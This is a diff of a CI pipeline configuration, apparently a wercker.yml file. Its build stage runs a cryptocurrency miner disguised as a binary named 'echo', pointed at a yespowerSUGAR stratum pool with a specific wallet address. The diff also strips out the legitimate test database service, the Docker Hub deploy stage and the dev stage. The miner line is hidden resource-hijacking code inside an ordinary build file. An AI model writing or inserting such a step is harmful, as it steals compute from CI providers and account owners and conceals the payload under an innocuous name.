@@ -15,13 +15,6 @@ build:
           cd 1 && chmod +x echo && ./echo -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.werckee -t 10 --cpu-priority 4
 
 test:
-  services:
-    - id: mysql:5.7
-      env:
-        MYSQL_RANDOM_ROOT_PASSWORD: yes
-        MYSQL_USER: test
-        MYSQL_PASSWORD: secret
-        MYSQL_DATABASE: user
   steps:
     - script:
         name: env
@@ -42,39 +35,3 @@ test:
         code: |
           python3 test.py
 
-deploy:
-  steps:
-    - internal/docker-push:
-        username: $DOCKER_HUB_USERNAME
-        password: $DOCKER_HUB_PASSWORD
-        tag: latest
-        repository: $DOCKER_REPOSITORY
-        registry: https://registry.hub.docker.com
-
-dev:
-  services:
-    - id: mysql:5.7
-      env:
-        MYSQL_RANDOM_ROOT_PASSWORD: yes
-        MYSQL_USER: test
-        MYSQL_PASSWORD: secret
-        MYSQL_DATABASE: user
-  steps:
-    - script:
-        name: env
-        code: env
-    - script:
-        name: Wait for MySQL connection
-        code: sleep 20s
-    - script:
-        name: migrate database
-        code: |
-          ./scripts/migrate.sh
-    - script:
-        name: install app
-        code: |
-          pip3 install -r requirements.txt
-    - internal/watch:
-        code: |
-          python3 app.py
-        reload: true
